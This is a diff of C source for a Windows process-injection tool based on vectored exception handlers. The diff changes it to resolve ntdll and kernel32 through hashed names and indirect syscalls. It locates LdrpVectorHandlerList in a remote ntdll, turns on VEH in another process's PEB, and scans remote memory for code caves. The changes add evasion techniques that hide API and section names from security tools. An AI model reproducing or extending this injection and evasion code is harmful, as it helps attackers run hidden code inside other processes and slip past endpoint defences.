@@ -1,5 +1,7 @@
 ﻿#include "VEHinj.h"
 
+#undef RtlCopyMemory
+
 LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo);
 NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
 NTSTATUS SFNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
@@ -9,6 +11,23 @@ NTSTATUS SFNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS Proc
 NTSTATUS SFNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);
 NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
 NTSTATUS SFNtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
+
+#ifdef DEBUG
+size_t SFstrlen(const char* str)
+{
+	const char* p = str;
+	while (*p)  // 当 *p != '\0' 时继续
+		p++;
+	return (size_t)(p - str);
+}
+
+size_t SFwcslen(const wchar_t* str)
+{
+	const wchar_t* p = str;
+	while (*p)  // 当 *p != L'\0' 时继续
+		p++;
+	return (size_t)(p - str);
+}
 
 FORCEINLINE VOID SFRtlInitUnicodeString( // 使用自定义wcslen的RtlInitUnicodeString宏 其余一致
 	_Out_ PUNICODE_STRING DestinationString,
@@ -34,6 +53,7 @@ FORCEINLINE VOID SFRtlInitAnsiString( // 与上个函数同理
 
 	DestinationString->Buffer = (PCHAR)SourceString;
 }
+#endif
 
 // 输出DEBUG字符串
 void PrintDbgA(char* message) {
@@ -65,6 +85,8 @@ DWORD ConvertProcNameToPid(wchar_t* ProcName) {
 	SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);
 	PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
 	while (TRUE) {
+		typedef PVOID(NTAPI* pwcsstr)(const wchar_t* _Str, const wchar_t* _SubStr);
+		pwcsstr SFwcsstr = (pwcsstr)SW3_GetSyscallAddress(0x15a4297);
 		if (pInfo->ImageName.Buffer && SFwcsstr(pInfo->ImageName.Buffer, ProcName)) {
 			DWORD pid = (DWORD)pInfo->UniqueProcessId;
 			HeapFree(GetProcessHeap(), NULL, buffer);
@@ -94,99 +116,49 @@ HANDLE ElevateHandle(IN HANDLE hProcess, IN ACCESS_MASK DesiredAccess, IN DWORD 
 // Obtain the entry point address of local kernel32.dll
 PVOID GetLocalKernel32EntryPoint()
 {
-	PROCESS_BASIC_INFORMATION pbi = { 0 };
-	ULONG retLen = 0;
-	SFNtQueryInformationProcess((HANDLE)(LONG_PTR)-1, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
-
-	PPEB peb = (PPEB)pbi.PebBaseAddress;
-	if (!peb || !peb->Ldr)
-		return NULL; // Err: 读取PEB或LDR失败
-
-	PPEB_LDR_DATA ldr = peb->Ldr;
-	PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
-	PLIST_ENTRY node = head->Flink;
-
-	static const WCHAR target[] = L"KERNEL32.DLL";
-	size_t targetLen = (sizeof(target) / sizeof(target[0])) - 1; // 不含终止符
-
-	while (node != head)
-	{
-		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(node, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
-		UNICODE_STRING* baseName = &entry->BaseDllName;
-		if (baseName->Buffer && baseName->Length)
-		{
-			USHORT nameLen = baseName->Length / (USHORT)sizeof(WCHAR);
-			if ((size_t)nameLen == targetLen)
-			{
-				BOOLEAN equal = TRUE;
-				for (size_t i = 0; i < targetLen; ++i)
-				{
-					if (baseName->Buffer[i] != target[i]) {
-						equal = FALSE;
-						break;
-					}
-				}
-				if (equal)
-				{
-					PBYTE imageBase = (PBYTE)entry->DllBase;
-					PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageBase;
-					if (dos->e_magic != IMAGE_DOS_SIGNATURE)
-						return NULL; // Err: 非法的DOS头
-					PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(imageBase + dos->e_lfanew);
-					if (nt->Signature != IMAGE_NT_SIGNATURE)
-						return NULL; // Err: 非法的NT头
-					DWORD rva = nt->OptionalHeader.AddressOfEntryPoint;
-					return (PVOID)(imageBase + rva);
-				}
-			}
-		}
-		node = node->Flink;
-	}
-
-	return NULL; // Err: 未找到kernel32.dll
+	PVOID DllBase = GetDllBase(0x6e72656b, 0x32336c65);
+	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
+	PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)DllBase + DosHeader->e_lfanew);
+	DWORD rva = NtHeaders->OptionalHeader.AddressOfEntryPoint;
+	return (PVOID)((PBYTE)DllBase + rva);
 }
 
+// 更好的GetNtdllSectionVa函数 使用SW3函数找到NtDLL基址
+// Better GetNtdllSectionVa function Using SW3 function to find NtDLL base address
+BOOL GetNtdllSectionVa(DWORD SectionHash,
+	PVOID* sectionVa,
+	DWORD* sectionSize)
+{
+	PVOID ntdllBase = GetDllBase(0x6c64746e, 0x6c642e6c); // ntdll.dl的反写
+	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdllBase;
+	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdllBase + dos->e_lfanew); // 解析NT头
 
-
-typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(IN HANDLE ProcessHandle, IN int ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL);
-typedef HRESULT(WINAPI* pRtlEncodeRemotePointer)(_In_ HANDLE ProcessToken, _In_opt_ PVOID Ptr, _Out_ PVOID* EncodedPtr);
-
-//Get address and size of a section within NTDLL (via LdrGetDllHandle)
-BOOL GetNtdllSectionVa(char* sectionName, PVOID* sectionVa, DWORD* sectionSize) {
-	PVOID hNtdll = NULL;
-	UNICODE_STRING usNtdll;
-	SFRtlInitUnicodeString(&usNtdll, L"ntdll.dll");
-	NTSTATUS status = LdrGetDllHandle(NULL, NULL, &usNtdll, &hNtdll);
-	if (hNtdll == NULL) {
-		return FALSE;
-	}
-
-	PIMAGE_DOS_HEADER ntdllDos = (PIMAGE_DOS_HEADER)hNtdll;
-	PIMAGE_NT_HEADERS ntdllNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + ntdllDos->e_lfanew);
-	for (WORD i = 0; i < ntdllNt->FileHeader.NumberOfSections; i++) {
-		PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntdllNt) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
-		if (!SFstrcmp((char*)sectionHeader->Name, sectionName)) {
-			*sectionVa = (PVOID)((ULONG_PTR)hNtdll + sectionHeader->VirtualAddress);
-			*sectionSize = sectionHeader->Misc.VirtualSize;
+	// 遍历section 匹配名字
+	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+	for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
+		DWORD Hash = SW3_HashSyscall(sec->Name);
+		if (Hash == SectionHash) {
+			*sectionVa = (PVOID)((BYTE*)ntdllBase + sec->VirtualAddress);
+			*sectionSize = sec->Misc.VirtualSize;
+			return TRUE;
 		}
 	}
-	return TRUE;
+
+	return FALSE; // 未找到对应section
 }
 
-//Taken from here: https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c
+// 直接摘自PassTheHashBrowns的VectoredExceptionHandling项目 基本无修改
+// Taken from here: https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c
 PVOID findLdrpVectorHandlerList(PVOID VEH)
 {
 	BOOL found = FALSE;
-
-	if (VEH == NULL)
-		return NULL;
 
 	PLIST_ENTRY next = ((PLIST_ENTRY)VEH)->Flink;
 
 	PVOID sectionVa;
 	DWORD sectionSz;
 	// LdrpVectorHandlerList will be found in the .data section of NTDLL.dll
-	if (GetNtdllSectionVa(".data", &sectionVa, &sectionSz))
+	if (GetNtdllSectionVa(0xd3bc39b6, &sectionVa, &sectionSz)) // 0xd3bc39b6 = .data
 	{
 		while ((PVOID)next != VEH)
 		{
@@ -205,7 +177,8 @@ PVOID findLdrpVectorHandlerList(PVOID VEH)
 	return found ? next : NULL;
 }
 
-//Enable the ProcessUsingVEH bit in the CrossProcessFlags member of the remote process PEB
+// 直接摘自PassTheHashBrowns的VectoredExceptionHandling项目 基本无修改
+// Enable the ProcessUsingVEH bit in the CrossProcessFlags member of the remote process PEB
 BOOL EnableRemoteVEH(HANDLE hProcess) {
 	PROCESS_BASIC_INFORMATION processInfo = { 0 };
 	ULONG returnLength = 0;
@@ -237,6 +210,7 @@ BOOL EnableRemoteVEH(HANDLE hProcess) {
 }
 
 // 扫描远程进程指定区域 查找满足对齐要求且长度为holeSize的连续零字节空洞
+// Scan the specified area of the remote process to find a contiguous zero-byte hole that meets the alignment requirements and has a length of holeSize
 PVOID FindZeroHoleInRemote(
 	HANDLE hProcess, // 目标进程句柄
 	PVOID regionBase, // 指定区域基址
